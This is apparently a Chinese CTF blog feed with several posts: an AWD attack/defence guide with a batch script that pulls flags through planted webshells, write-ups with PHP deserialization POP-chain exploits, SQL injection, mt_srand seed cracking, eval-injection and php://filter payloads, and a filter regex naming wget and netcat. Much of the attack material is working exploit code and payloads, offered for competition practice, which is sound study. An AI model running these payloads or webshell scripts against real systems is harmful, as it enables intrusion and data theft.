re.search("flag&#123;[.*&#125;",html).group() return flag# 提交flagdef submib_Flag(ip,flag): url = "http://172.15.91.101/lms/portal/sp/hz_flag.php" # flag提交地址 data = &#123;"melee_ip":"","melee_flag":""&#125; data['melee_ip'] = ip # 靶机ip data['melee_flag'] = flag # 该靶机上flag print(flag) header = &#123;"cookie":"SSCSum=1; lms_login_name=cqipc1; zlms-sid=ruf8d3qk28iqtooa52fbsmke01; webcs_test_cookie=lms_cookie_checker"&#125; resp = requests.post(url,data=data,headers=header) #print(len(resp.text)) # 返回页面提示 if "您已提交过当前IP和FLAG，请确认！" in resp.text: print("\033[1;33m已提交过\033[0m") elif "您提交得FLAG错误，请继续努力" in resp.text: print("\033[1;31m提交错误\033[0m") elif "恭喜您答对了" in resp.text: print("\033[1;32m提交成功\033[0m") elif len(resp.text) == 1744: print("\033[1;31;30m未登录\033[0m") exit() # 暂停10s time.sleep(10)def main(): for ip in range(101,109): try: ip = "172.20."+str(ip)+".101" print("This:"+ip) # 第一个flag url_payload1 = "http://"+ip+"/W3bShell/webshell.php?a=cat /flag.txt" submib_Flag(ip,getFlag(request(url_payload1))) # 第二个flag url_payload2 = "http://"+ip+"/W3bShell/webshell.php?a=cat /var/www/admin/flag2.txt" submib_Flag(ip,getFlag(request(url_payload2))) except: passif __name__ == '__main__': main() web漏洞获取flag写批量提交的条件 知道赛场所有靶机ip地址知道获取flag的payload payload种类：命令执行 1cat /flag.txt 代码执行(用下面方式 弥补 命令执行带参数命令 不能回显的缺陷) 1@eval(base64_decode($_GET[z0]));&amp;z0=c3lzdGVtKCdjYXQgL2ZsYWcudHh0Jyk7 文件包含 1?file=../../../flag.txt ssh获取flagshell写批量登录ssh脚本拿flag的条件 知道所有靶机ip地址知道ssh密码知道flag位置 监控 注意权限问题：那些尽量选用低权限能用的 tail命令监控日志1tail -f [日志文件] 1234567891011ctf@4ef271a9a03b:/tmp$ tail -f log.txt 访问链接：/index.php?请求方法：GETCookie: Array()POST: --------------end----------------- 日志/流量监控 流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量 被上马一定要先备份到本地，再删除、去分析反打别人 网上搜集脚本 php log.php 12345678910111213141516171819202122&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"];//记录访问者的ip$filename = $_SERVER['PHP_SELF'];//访问者要访问的文件名$parameter = $_SERVER["QUERY_STRING"];//访问者要请求的参数$method = $_SERVER['REQUEST_METHOD'];//请求方法$time = date('Y-m-d H:i:s',time());//访问时间$post = file_get_contents("php://input",'r');//接收POST数据$logadd = "访问者IP：".$ip."\r\n".'访问时间：'.$time."\r\n".'访问链接：'.$filename.'?'.$parameter."\r\n"."请求方法：".$method."\r\n";$others = "POST: ".$post."\r\n";// log记录$fh = fopen("/tmp/log.txt", "a");fwrite($fh, "-------------start----------------\r\n");fwrite($fh, $logadd);fwrite($fh,"Cookie: \r\n".print_r($_COOKIE, true)."\r\n");fwrite($fh,$others."\r\n");fwrite($fh, "--------------end-----------------\r\n");fclose($fh);?&gt; 12# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once "/tmp/waf.php";?&gt;find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o -type f -name '*.php'|xargs sed -i '1i&lt;?php require_once "/tmp/log.php";?&gt;' 问题：不能监控linux隐藏文件的访问， 比如 .index.php 访问这个文件就检测不到。 文件监控 注意：被上马一定要先备份到本地，再删除、去分析反打别人 网上收集脚本 https://www.shuzhiduo.com/A/GBJrKlDG50/ 使用方法 上传到靶机/tmp目录下 123456789101112131415ctf@4ef271a9a03b:/tmp/FileMonitor-master$ python main.py _____________ &lt; FileMonitor &gt; ------------- /\_)o&lt; | | | O . O | \_____/ By CoolCat [08:36:56]:Please enter a directory:/var/www/html/[08:37:01]:FileMonitor is running...[08:37:07]:修改了/var/www/html/.a.php Hash为：41f12630a50703b6026654e2de8cada1[08:37:07]:删除了/var/www/html/.a.php[08:37:15]:新建了/var/www/html/.a.php 监控目录 1/var/www/html/ 问题：垃圾日志太多 weblogger（不熟悉暂且不用）一个针对php的web流量抓取、分析的应用。 使用方法 123456789cd /var/www/html/ (or other web dir)git clone https://github.com/wupco/weblogger.gitchmod -R 777 weblogger/open http://xxxxx/weblogger/install.php in Web browserinstall it 进程/端口监控(不熟悉暂且不用)网上收集脚本 部署waf waf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在 每个文件前边加 require_once(waf.php); 改 .user.ini配置文件 auto_prepend_file=; 包含在文件头auto_append_file=; 包含在文件尾 注：如果挂了waf出现持续扣分，waf去掉 有root权限 1. 12345678910#每个文件前边加 require_once(waf.php);find /var/www/html -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g"find /var/www/html -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waf.php\");/g"上waf：$ find . -path ./waffffff -prune -o -type f -name "*.php" -print | xargs sed -i "s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/g"下waf：$ find . -path ./waffffff -prune -o -type f -name "*.php" -print | xargs sed -i "s/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/&lt;?php/g" 2. 12345vim php.iniauto_append_file = "/dir/path/phpwaf.php"重启Apache或者php-fpm就能生效了。 3. 1234改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;; 包含在文件头auto_append_file=&lt;filename&gt;; 包含在文件尾php_value auto_prepend_file "/dir/path/phpwaf.php" 注：如果挂了waf出现持续扣分，waf去掉 只有user权限 没写系统权限就只能在代码上面下手了，也就是文件包含。 这钟情况又可以用不同的方式包含。 1. 如果是框架型应用，那麽就可以添加在入口文件，例如index.php， 如果不是框架应用，可以在公共配置文件config.php等相关文件中包含。 1include('phpwaf.php'); 2. 替换index.php，也就是将index.php改名为index2.php，然后讲phpwaf.php改成index.php。 当然还没完，还要在原phpwaf.php中包含原来的index.php 123index.php -&gt; index2.phpphpwaf.php -&gt;index.phpinclude('index2.php'); 修改权限mysqll用户读表权限上传目录是否可执行的权限 部署文件监控脚本php.ini 1auto_prepend_file = waf.php的路径; 123456789require_once(&apos;waf.php&apos;);常用cms添加waf位置PHPCMS V9 \phpcms\base.phpPHPWIND8.7 \data\sql_config.phpDEDECMS5.7 \data\common.inc.phpDiscuzX2 \config\config_global.phpWordpress \wp-config.phpMetinfo \include\head.php 其他通用waf https://github.com/DasSecurity-HatLab/AoiAWD]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF-AWD</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [GYCTF2020]Easyphp 1]]></title>
    <url>%2F2021%2F10%2F29%2F%5BGYCTF2020%5DEasyphp%201%2F</url>
    <content type="text"><![CDATA[考点代码审计 反序列化（pop链构造、字符串逃逸） 前言这道题，对我来说确实比较难，看着wp都做好半天，第一个点就是找反序列化入口那，我看着serialize(new Info($age,$nickname)很茫然，不知道会返回什么结果，后门单独把这个Info类拿出来序列化，就找到头绪了，虽说以前做过这种类型的题，但是再次遇上还是摸不着头脑，还有利用点,还不清楚select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?这个语句的作用。后边再来做几遍。 解题过程123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);session_start();//function safe($parm)&#123;// $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");// return str_replace($array,'hacker',$parm);//&#125;class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?'); if($this-&gt;id)&#123; $_SESSION['id']=$this-&gt;id; $_SESSION['login']=1; echo "你的ID是".$_SESSION['id']; echo "你好！".$_SESSION['token']; echo "&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"; return $this-&gt;id; &#125; &#125; &#125; public function update()&#123; // 反序列化入口 $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']); //这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age=$_POST['age']; $nickname=$_POST['nickname']; echo safe(serialize(new Info($age,$nickname))); return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//危 &#125; public function __toString() &#123; // $this-&gt;nickname = Info() $this-&gt;nickname-&gt;update($this-&gt;age); return "0-0"; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; // $this-&gt;CtrlCase = echo "__call"; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo "__destruct"; echo $this-&gt;sql; &#125;&#125;class dbCtrl&#123; public $hostname="127.0.0.1"; public $dbuser="root"; public $dbpass="root"; public $database="test"; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; &#125; public function login($sql) &#123; echo "login";// echo $sql; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die("连接失败，错误:" . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') &#123; return $idResult; &#125; if (!$idResult) &#123; echo('用户不存在!'); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo('密码错误！'); return false; &#125; $_SESSION['token']=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125;// UpdateHelper::__destruct-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login-&gt;$result=$this-&gt;mysqli-&gt;prepare($sql);$u1 = new UpdateHelper();$user = new User();$info = new Info();$dbctrl = new dbCtrl();$dbctrl-&gt;password = "1";;$dbctrl-&gt;name = "admin";$info-&gt;CtrlCase = $dbctrl;$user-&gt;age = 'select id,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';$user-&gt;nickname = $info;$u1-&gt;sql = $user;echo serialize($u1); 解题脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);session_start();function safe($parm)&#123; // 有点像字符串逃逸 $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter"); return str_replace($array,'hacker',$parm);&#125;class User&#123; public $age=null; public $nickname=null;&#125;class Info&#123; public $CtrlCase; // 可控&#125;Class UpdateHelper&#123; public $sql;&#125;class dbCtrl&#123; public $password; public $name;&#125;$u1 = new UpdateHelper();$user = new User();$user-&gt;age[0] = 'select id,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';$info = new Info();$dbCtrl = new dbCtrl();$dbCtrl-&gt;name = "admin";$dbCtrl-&gt;password = "1";$info-&gt;CtrlCase = $dbCtrl;$user-&gt;nickname = $info;$u1-&gt;sql= $user;echo serialize($u1);// 链条：UpdateHelper::__destruct-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql)]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>反序列化（pop链构造、字符串逃逸）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [MRCTF2020]Ezaudit 1]]></title>
    <url>%2F2021%2F10%2F28%2F%5BMRCTF2020%5DEzaudit%201%2F</url>
    <content type="text"><![CDATA[考点文件泄露 mt_srand伪随机数构造 sql注入 解题过程打开 扫目录扫到www.zip，压缩包中有一个index.php文件，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php header('Content-type:text/html; charset=utf-8');error_reporting(0);if(isset($_POST['login']))&#123; $username = $_POST['username']; $password = $_POST['password']; $Private_key = $_POST['Private_key']; if (($username == '') || ($password == '') ||($Private_key == '')) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header('refresh:2; url=login.html'); echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"; exit;&#125; // KVQP0LdJKRaV else if($Private_key != '*************' ) &#123; header('refresh:2; url=login.html'); echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"; exit; &#125; else&#123; if($Private_key === '************')&#123; $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; // $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'".';'; $link=mysql_connect("localhost","root","root"); mysql_select_db("test",$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo "&lt;tr&gt;&lt;td&gt;".$row["username"]."&lt;/td&gt;&lt;td&gt;".$row["flag"]."&lt;/td&gt;&lt;td&gt;"; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) // mt_srand(xxx); 1775196155 // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数 // 如果我们知道了 xxx 我们就掌握了随机数的生成规律 $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // 返回结果：KVQP0LdJKRaV3n9D // 这里通过返回结果反推出随机数 &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key??? 将公钥转换成随机数生成的数字12345678910111213import requestsimport randomdict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'dict2='KVQP0LdJKRaV3n9D'dict3 = dict1[::-1] length = len(dict2) res=''for i in range(len(dict2)): for j in range(len(dict1)): if dict2[i] == dict1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' ' breakprint(res) 得到 136 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 通过php_mt_seed爆破出随机数种子 得到 11775196155 设置mt_srand值为17751961551234567891011121314151617181920212223&lt;?phpmt_srand(1775196155);function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) // mt_srand(xxx); 1775196155 // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数 // 如果我们知道了 xxx 我们就掌握了随机数的生成规律 $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // 返回结果：KVQP0LdJKRaV3n9D // 这里通过返回结果反推出随机数&#125;function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key()."\n";echo private_key(); 得到 12KVQP0LdJKRaV3n9DXuNhoueCDCGc 拿到了Private_key，接下来就是提交 123"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';';"SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'".';'; // 绕过即可 post 1login=123&amp;username=aaa&amp;password=1&apos; or &apos;1&amp;Private_key=XuNhoueCDCGc 总结老考点，不是很难。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件泄露</tag>
        <tag>mt_srand伪随机数构造</tag>
        <tag>sql绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[awd-platform操作笔记]]></title>
    <url>%2F2021%2F10%2F26%2Fawd-platform%E6%93%8D%E4%BD%9C%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[平台使用笔记根据当前队伍数量copy所有的队伍的比赛文件夹 1python batch.py web_server 5 启动比赛 1python start.py ./ 5 启动check脚本 123docker attach check_serverpython check.py 比赛参数Flag 提交： 172.17.0.6:80/flag_file.php?token=teamx&amp;flag=xxxx (x为你们的队伍号) 攻击情况url地址：http://flag服务器IP:端口/result.txt 得分情况地址：http://flag服务器IP:端口/score.txt]]></content>
      <categories>
        <category>CTF</category>
        <category>平台使用笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【反序列化】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F10%2F24%2FCTF-Web%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做反序列化类题目的做题姿势，会不断更新。 反序列化考点 字符串逃逸 POP构造链 反序列化做题姿势 首先 正常创建类 有方法调用方法 总之要得到想要的内容 其次 对创建的类进行序列化 并打印出序列化的内容 需要绕过就更改里面的内容 最后 把序列化后的内容 进行提交 有需要编码 就进行编码 pop链构造做题姿势 phar反序列化的三个前提条件&gt; 可以上传phar文件 有可以利用的魔术方法 文件操作函数的参数可控 1、找到可利用的地方，比如，文件包含，命令执行等地方2、从可以利用地方回溯到可控制的地方，找到一个链条。3、更改属性内容，先进行序列化，看看能不能达到目的。4、能够达到目的，才进行反序列化，进行提交 有需要编码 就进行编码 魔法方法PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括： 1. __construct()，类的构造函数 2. __destruct()，类的析构函数 3. __call()，在对象中调用一个不可访问方法时调用 4. __callStatic()，用静态方式中调用一个不可访问方法时调用 5. __get()，获得一个类的成员变量时调用 6. __set()，设置一个类的成员变量时调用 7. __isset()，当对不可访问属性调用isset()或empty()时调用 8. __unset()，当对不可访问属性调用unset()时被调用。 9. __sleep()，执行serialize()时，先会调用这个函数 10. __wakeup()，执行unserialize()时，先会调用这个函数 11. __toString()，类被当成字符串时的回应方法 12. __invoke()，调用函数的方式调用一个对象时的回应方法 13. __set_state()，调用var_export()导出类时，此静态方法会被调用。 14. __clone()，当对象复制完成时调用 15. __autoload()，尝试加载未定义的类 16. __debugInfo()，打印所需调试信息phar反序列化利用可以代替unserialize 进行反序列化操作的函数123456789101112131415161718192021222324fileatime filectimefile_existsfile_get_contentsfile_put_contentsfilefilegroupfopenfileinodefilemtimefileownerfikepermsis_diris_executableis_fileis_linkis_readableis_writableis_writeableparse_ini_filecopyunlinkstatreadfile 注意：生成phar文件//生成phar文件前需要配置php.ini 123[Phar]; http://php.net/phar.readonlyphar.readonly = On 改成 Off 创建对象 exp.phar 是文件名12345678$phar = new Phar(&apos;exp.phar&apos;);$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ?&gt;&apos;);$phar-&gt;setMetadata($c1);// 要压缩的文件$phar-&gt;addFromString(&apos;exp.txt&apos;,&apos;test&apos;);$phar-&gt;stopBuffering(); 特性 在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞绕过_wakeup魔法方法 绕过方法：只需要将对象属性数量设置比原本的要大即可 利用php&gt;7.1版本对类属性的检测不严格(对属性类型不敏感) 意味着 序列化的时候可以将portected属性换成public属性 1234Private 权限%00类名%00属性名Protected 权限%00*%00属性名 绕过字符过滤s 换成 S 属性值就可以为十六进制 反序列化原生类的利用http://www.wangqingzheng.com/anquanke/82/238482.html]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DASCTF Oct 10月X 吉林工师 欢迎来到魔法世界～]]></title>
    <url>%2F2021%2F10%2F24%2FDASCTF%20Oct%2010%E6%9C%88X%20%E5%90%89%E6%9E%97%E5%B7%A5%E5%B8%88%20%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E9%AD%94%E6%B3%95%E4%B8%96%E7%95%8C%EF%BD%9E%2F</url>
    <content type="text"><![CDATA[MISCWELCOME DASCTFxJlenu 20012345678910┌──(kali㉿kali)-[~/Desktop]└─$ nc node4.buuoj.cn 27380Hello! CTFer!Welcome to Dasctf x Jlenu.Plz input your name&gt; open("flag.txt").read()Wow!Hello flag&#123;32973a47-601e-4a5a-b9cb-738fb5652bf2&#125; Give your gift https://www.youtube.com/watch?v=dQw4w9WgXcQ Web迷路的魔法少女123456789101112131415161718192021222324252627282930313233343536&lt;?phphighlight_file('index.php');extract($_GET);error_reporting(0);function String2Array($data)&#123; if($data == '') return array(); @eval("\$array = $data;"); return $array;&#125;// 判断 $attrid 和 $attrvalue 是否都为数组if(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123; $attrstr .= 'array('; // 拿到$attrid数组长度 $attrids = count($attrid); // 遍历 $attrid 数组 for($i=0; $i&lt;$attrids; $i++) &#123; // ?attrid[0]=attrvalue1&amp;$attrvalue[0]=phpinfo(); // array("attrid1"=&gt;"attrvalue1","attrid2"=&gt;"attrvalue2"); // array("666"= $attrstr .= '"'.intval($attrid[$i]).'"=&gt;'.'"'.$attrvalue[$i].'"'; if($i &lt; $attrids-1) &#123; $attrstr .= ','; &#125; &#125; $attrstr .= ');';&#125;// 调用// 假设为 array("attrid1"=&gt;"attrvalue1","attrid2"=&gt;"attrvalue2");// 假设为 array("attrid1"=&gt;"attrvalue1","attrid2"=&gt;"$&#123;phpinfo();&#125;");String2Array($attrstr); payload 1?attrid[0]=attrvalue1&amp;attrvalue[0]=$&#123;eval($_POST[&apos;cmd&apos;])&#125;; 参考资料 https://www.yisu.com/zixun/55478.html]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021年“绿盟杯”重庆市大学生信息安全竞赛部分wp]]></title>
    <url>%2F2021%2F10%2F23%2F2021%E5%B9%B4%E2%80%9C%E7%BB%BF%E7%9B%9F%E6%9D%AF%E2%80%9D%E9%87%8D%E5%BA%86%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp%2F</url>
    <content type="text"><![CDATA[MISC（MISC和Crypto队友做的）签到题base64，找个网站解密一下就出来了 Huahua解压后得到png图片，打不开，用winhex打开，发现文件头缺少了，添加png文件头，调整图片高度得到flag Noise解压后得到三个文件，发现 这个文件有点可疑，联想noise改后缀为.wav，用Audacity打开此文件， cypto签到2根据古罗马提示得知是：凯撒密码其中为位移3 Easy-rsa得知e，n，dp，c，求m 跑出来结果为： WEBflag在哪里1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?phperror_reporting(0);class begin&#123; public $file; public $mode; public $content; public $choice; public function __construct() &#123; $this-&gt;file = "file"; $this-&gt;content = "content"; &#125; function __wakeup() &#123; if($this-&gt;mode=="write")&#123; $this-&gt;choice= new write(); &#125; if($this-&gt;mode=="read")&#123; $this-&gt;choice= new read(); &#125; &#125; // __call()，在对象中调用一个不可访问方法时调用 function __call($file,$content) &#123; // 利用点 highlight_file($this-&gt;file); &#125; function __destruct()&#123; if($this-&gt;mode=="write")&#123; // 触发 __call $this-&gt;choice-&gt;writewritetxt($this-&gt;file,$this-&gt;content); &#125; else&#123; $this-&gt;choice-&gt;open($this-&gt;file); &#125; &#125;&#125;class write&#123; public function writewritetxt($file,$content) &#123; $filename=$file.".txt"; // 拼接了后缀 if(is_file($filename))&#123; unlink($filename); &#125; // 利用点：不可利用 file_put_contents($filename, $content); echo "成功写入"; &#125;&#125;class read&#123; public $file; public function __construct()&#123; $this-&gt;file="test.txt"; echo "欢迎查看 ".$this-&gt;file."&lt;br/&gt;"; &#125; function open($filename)&#123; $file=$this-&gt;file; if(is_file($file))&#123; if($file=="getflag.php")&#123; die("getflag.php没东西"); &#125; else&#123; // 利用点：不可利用 // 伪协议读取：但是 if_file不通过就执行不了 // highlight_file($file); &#125; &#125;else&#123; echo "文件不存在"; &#125; &#125;&#125;function check($dis_content)&#123; if(preg_match('/system|eval|wget|exec|zip|passthru|netcat|phpinfo|`|shell|\(|\)/i', $dis_content))&#123; die("hack !!!"); &#125;&#125;$pop=$_GET['pop'];if (isset($pop)) &#123; check($pop); unserialize($pop);&#125; else &#123; highlight_file("index.php");&#125;?&gt; payload 1?pop=O:5:&quot;begin&quot;:5:&#123;s:4:&quot;file&quot;;s:11:&quot;getflag.php&quot;;s:4:&quot;mode&quot;;s:5:&quot;write&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;s:6:&quot;choice&quot;;O:5:&quot;begin&quot;:4:&#123;s:4:&quot;file&quot;;s:11:&quot;getflag.php&quot;;s:4:&quot;mode&quot;;s:5:&quot;write&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;s:6:&quot;choice&quot;;N;&#125;&#125; mid文件包含，使用php://filter在根目录包含出flag即可 1http://119.61.19.212:57303/index.php?1=php://filter/read=convert.base64-encode/resource=../../../flag 寻宝奇兵第一关：$hash可控 $users可控 $SECRET也知道 $users 随便传，只要不是explorer，再让$SECRET跟$users拼接，然后md5加密 将得到的结果通过$_COOKIE[“hash”]传入，将构造的$users传入，即可进入第二关。 第二关：参照 http://www.oriole.fun/index.php/archives/31/ 进入第三关 第三关：PCRE回溯次数绕过 123456789import requestsfrom io import BytesIOdata = &#123; 'treasure': BytesIO(b'flag.php' + b' a' * 1000000)&#125;res = requests.post('http://119.61.19.217:57305/treasure.php', data=data)print(res.text) Serialize12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(0);highlight_file(__FILE__);class Demo&#123; public $class; public $user; public function __construct() &#123; $this-&gt;class = "safe"; $this-&gt;user = "ctfer"; $context = new $this-&gt;class ($this-&gt;user); foreach($context as $f)&#123; echo $f; &#125; &#125; public function __wakeup() &#123; $context = new $this-&gt;class ($this-&gt;user); foreach($context as $f)&#123; echo $f; &#125; &#125;&#125;class safe&#123; var $user; public function __construct($user) &#123; $this-&gt;user = $user; echo ("hello ".$this-&gt;user); &#125;&#125;if(isset($_GET['data']))&#123; unserialize($_GET['data']);&#125;else&#123; $demo=new Demo;&#125; payload 1data=O:4:&quot;Demo&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;user&quot;;s:8:&quot;flag.php&quot;;&#125; 原生类利用 http://www.wangqingzheng.com/anquanke/82/238482.html]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【文件包含】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F10%2F23%2FCTF-Web%E3%80%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
